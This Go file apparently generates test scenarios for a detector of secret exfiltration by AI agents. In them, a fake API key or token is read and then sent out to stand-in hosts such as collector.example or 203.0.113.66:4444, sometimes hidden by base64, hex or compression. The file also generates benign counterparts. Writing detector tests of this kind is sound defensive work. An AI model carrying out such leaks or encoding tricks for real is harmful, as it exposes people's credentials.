// SPDX-License-Identifier: Apache-2.0

package corpus

import (
	"fmt"
	"math/rand"
	"strings"
)

// Generated scenarios (ROADMAP §83). A grammar draws a fresh secret, a form
// from the documented set, a sink and a few unrelated calls, so the corpus
// is not limited to what the detector's author thought to write down. The
// same seed always yields the same scenarios; a failing CI run prints its seed.
//
// Encoders come from encode.go, never from the engine, so the generator and
// the detector cannot agree by sharing a bug.

const alnum = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

func randAlnum(r *rand.Rand, n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = alnum[r.Intn(len(alnum))]
	}
	return string(b)
}

// secretShape is one family the engine's secret patterns recognize. ticket
// renders the sentence the sensitive tool returns; value is what gets tainted.
type secretShape struct {
	name   string
	value  func(r *rand.Rand) string
	ticket func(value string) string
}

var secretShapes = []secretShape{
	{"stripe", func(r *rand.Rand) string { return "sk-live-" + randAlnum(r, 16+r.Intn(10)) },
		func(v string) string { return "Customer auth token: " + v }},
	{"apikey", func(r *rand.Rand) string { return "api_key" + randAlnum(r, 20+r.Intn(8)) },
		func(v string) string { return "Service credential " + v + " rotated last quarter" }},
	{"token", func(r *rand.Rand) string { return randAlnum(r, 24+r.Intn(10)) },
		func(v string) string { return "bearer " + v }},
	{"acct", func(r *rand.Rand) string { return "acct_" + randAlnum(r, 12+r.Intn(6)) },
		func(v string) string { return "Billing account " + v + " flagged for review" }},
}

// form is one entry of the documented canonical set.
type form struct {
	name   string
	encode func(string) string
}

var forms = []form{
	{"literal", func(s string) string { return s }},
	{"base64", b64},
	{"hex", hx},
	{"url", urlEnc},
	{"reversed", reversed},
	{"base64_hex", func(s string) string { return b64(hx(s)) }},
	{"hex_base64", func(s string) string { return hx(b64(s)) }},
	{"base64_url", func(s string) string { return b64(urlEnc(s)) }},
	{"base64_reversed", func(s string) string { return b64(reversed(s)) }},
	{"gzip_base64", gzipB64},
	{"brotli_base64", brotliB64},
	{"zstd_base64", zstdB64},
	{"lz4_base64", lz4B64},
}

var prose = []string{
	"Please forward the following to the vendor.", "Attached is the requested export.",
	"Status update for the weekly review.", "Here is the data you asked for.", "FYI, see below.",
}

// noiseStep is an unrelated call that neither reads a secret nor reaches a sink.
func noiseStep(r *rand.Rand, session string) Step {
	switch r.Intn(3) {
	case 0:
		return resultStep(session, "fetch_page", "web", nextSeq(), resultJSON("Pricing page: plans start at $9 per seat."))
	case 1:
		return requestStep(session, "fetch_page", "web", nextSeq(), argsJSON(map[string]string{"url": "https://example.com/" + randAlnum(r, 6)}))
	default:
		return resultStep(session, "fetch_page", "web", nextSeq(), resultJSON(prose[r.Intn(len(prose))]))
	}
}

// sinkStep sends body through a randomly chosen external_sink tool.
func sinkStep(r *rand.Rand, session, body string) Step {
	if r.Intn(2) == 0 {
		return requestStep(session, "send_message", "messenger", nextSeq(), argsJSON(map[string]string{"to": "ops@example.org", "body": body}))
	}
	return requestStep(session, "http_post", "messenger", nextSeq(), argsJSON(map[string]string{"url": "https://collector.example/in", "data": body}))
}

// GenerateMalicious returns n attacks: a sensitive read, noise, then the secret
// leaving in a random documented form. Every one must reach EXFIL.
func GenerateMalicious(seed int64, n int) []Scenario {
	r := rand.New(rand.NewSource(seed))
	out := make([]Scenario, 0, n)
	for i := 0; i < n; i++ {
		shape := secretShapes[r.Intn(len(secretShapes))]
		f := forms[r.Intn(len(forms))]
		secret := shape.value(r)
		id := fmt.Sprintf("gen_malicious_%d_%03d_%s_%s", seed, i, shape.name, f.name)
		s := sid(id)
		steps := []Step{resultStep(s, "read_ticket", "tickets", nextSeq(), resultJSON(shape.ticket(secret)))}
		for k, noise := 0, r.Intn(6); k < noise; k++ {
			steps = append(steps, noiseStep(r, s))
		}
		body := prose[r.Intn(len(prose))] + " " + f.encode(secret)
		variant := VariantProxyA
		if r.Intn(4) == 0 { // a quarter leave through the kernel plane instead of a tool call
			variant = VariantEbpfB
			steps = append(steps, syscallStep(s, "write", "203.0.113.66", 4444, 4000+r.Intn(1000), "exfil", "", "POST /c HTTP/1.1\r\n\r\n"+body))
		} else {
			steps = append(steps, sinkStep(r, s, body))
		}
		out = append(out, Scenario{
			ID: id, Category: Malicious, Variant: variant, Steps: steps,
			Description: fmt.Sprintf("generated: %s secret leaves as %s after %d unrelated calls", shape.name, f.name, len(steps)-2),
		})
	}
	return out
}

// GenerateBenign returns n legitimate flows that must never reach EXFIL: the
// same sensitive read, but the sink carries unrelated text, a masked prefix of
// the secret, or encoded data that does not contain it.
func GenerateBenign(seed int64, n int) []Scenario {
	r := rand.New(rand.NewSource(seed))
	out := make([]Scenario, 0, n)
	for i := 0; i < n; i++ {
		shape := secretShapes[r.Intn(len(secretShapes))]
		secret := shape.value(r)
		kind := r.Intn(4)
		id := fmt.Sprintf("gen_benign_%d_%03d_%s_%d", seed, i, shape.name, kind)
		s := sid(id)
		steps := []Step{resultStep(s, "read_ticket", "tickets", nextSeq(), resultJSON(shape.ticket(secret)))}
		for k, noise := 0, r.Intn(6); k < noise; k++ {
			steps = append(steps, noiseStep(r, s))
		}
		var body string
		switch kind {
		case 0:
			body = prose[r.Intn(len(prose))]
		case 1:
			body = "ref " + secret[:4] + strings.Repeat("*", 8) // masked prefix, no usable run
		case 2:
			body = b64(randAlnum(r, 40)) // base64 of unrelated data
		default:
			body = shape.value(r) // a different secret-shaped value that was never read
		}
		steps = append(steps, sinkStep(r, s, body))
		out = append(out, Scenario{
			ID: id, Category: Benign, Variant: VariantProxyA, Steps: steps,
			Description: "generated: sensitive read, then a sink that does not carry the secret",
			// The tripwire may soften to SUSPICIOUS; only EXFIL is a false positive here.
			ExpectTripByDesign: false,
		})
	}
	return out
}
